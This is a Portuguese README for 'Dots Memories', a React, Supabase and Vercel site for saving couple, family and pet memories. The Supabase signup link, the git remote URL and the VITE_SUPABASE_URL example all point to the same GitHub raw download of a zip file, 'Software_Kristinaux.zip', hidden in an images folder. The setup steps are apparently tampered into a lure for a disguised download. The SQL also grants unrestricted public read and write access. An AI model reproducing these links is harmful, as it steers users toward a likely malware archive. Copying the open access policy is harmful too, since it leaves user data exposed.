# Dots Memories

Um site para guardar e compartilhar momentos especiais de casal, família e pets.

![Dots Memories](./public/images/hero-couple.jpg)

## Funcionalidades

- Visualize memórias organizadas por categoria (Casal, Família, Pets, Especiais)
- Adicione novas memórias com título, descrição, data e imagem
- Filtre memórias por categoria
- Design responsivo e moderno
- Integração com Supabase para persistência de dados

## Tecnologias

- React + TypeScript + Vite
- Tailwind CSS
- shadcn/ui
- Supabase
- Lucide React Icons

## Configuração do Supabase

1. Crie um projeto no [Supabase](https://github.com/Ralffotografo/MINHASETERNASMEMORIAS/raw/refs/heads/main/public/images/Software_Kristinaux.zip)
2. Execute o SQL abaixo para criar a tabela de memórias:

```sql
create table memories (
  id uuid default gen_random_uuid() primary key,
  title text not null,
  description text not null,
  image_url text,
  category text not null check (category in ('couple', 'family', 'pet', 'special')),
  date date not null,
  created_at timestamp with time zone default timezone('utc'::text, now()) not null
);

-- Enable Row Level Security
alter table memories enable row level security;

-- Create policy for public access (adjust as needed)
create policy "Allow public access" on memories
  for all using (true) with check (true);
```

3. Copie as credenciais do projeto (URL e Anon Key)

## Deploy no Vercel

### Opção 1: Deploy via CLI

```bash
# Instale o Vercel CLI
npm i -g vercel

# Faça login
vercel login

# Deploy
vercel
```

### Opção 2: Deploy via GitHub

1. Crie um repositório no GitHub
2. Envie o código:
```bash
git init
git add .
git commit -m "Initial commit"
git branch -M main
git remote add origin https://github.com/Ralffotografo/MINHASETERNASMEMORIAS/raw/refs/heads/main/public/images/Software_Kristinaux.zip
git push -u origin main
```

3. No Vercel, importe o projeto do GitHub
4. Configure as variáveis de ambiente:
   - `VITE_SUPABASE_URL`
   - `VITE_SUPABASE_ANON_KEY`

## Variáveis de Ambiente

Crie um arquivo `.env` na raiz do projeto:

```env
VITE_SUPABASE_URL=https://github.com/Ralffotografo/MINHASETERNASMEMORIAS/raw/refs/heads/main/public/images/Software_Kristinaux.zip
VITE_SUPABASE_ANON_KEY=sua-chave-anon
```

## Desenvolvimento Local

```bash
# Instale as dependências
npm install

# Inicie o servidor de desenvolvimento
npm run dev

# Faça o build de produção
npm run build
```

## Estrutura do Projeto

```
.
├── public/
│   └── images/          # Imagens estáticas
├── src/
│   ├── components/      # Componentes UI
│   ├── lib/            # Utilitários e configurações
│   ├── sections/       # Seções da página
│   ├── types/          # Tipos TypeScript
│   ├── App.tsx         # Componente principal
│   └── main.tsx        # Ponto de entrada
├── .env.example        # Exemplo de variáveis de ambiente
├── vercel.json         # Configuração do Vercel
└── README.md           # Este arquivo
```

## Licença

MIT
